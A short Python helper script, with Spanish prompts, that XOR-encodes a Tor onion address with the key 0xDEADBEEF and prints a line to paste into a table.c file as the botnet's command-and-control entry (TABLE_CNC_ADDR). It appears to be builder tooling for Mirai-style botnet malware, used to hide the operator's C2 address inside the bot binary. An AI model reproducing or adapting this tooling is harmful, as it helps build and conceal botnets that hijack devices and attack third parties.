import sys

def xor_string(s, key=bytearray([0xDE, 0xAD, 0xBE, 0xEF])):
    res = []
    for i, c in enumerate(s):
        res.append(ord(c) ^ key[i % len(key)])
    return res

def to_hex_string(bytes_list):
    return "".join(f"\\x{b:02x}" for b in bytes_list)

if len(sys.argv) < 2:
    print("Uso: python xor_onion.py <onion>")
    sys.exit(1)
    
onion = sys.argv[1]
xor_bytes = xor_string(onion)
    
print("\n--- Resultado para table.c ---")
print(f"dir: {onion}")
print(f"Lgd: {len(onion)}")
print(f"Bytes XOR: {to_hex_string(xor_bytes)}")
print("\nCopia esto en table.init():")
print(f'add_entry(TABLE_CNC_ADDR, "{to_hex_string(xor_bytes)}", {len(onion)});')
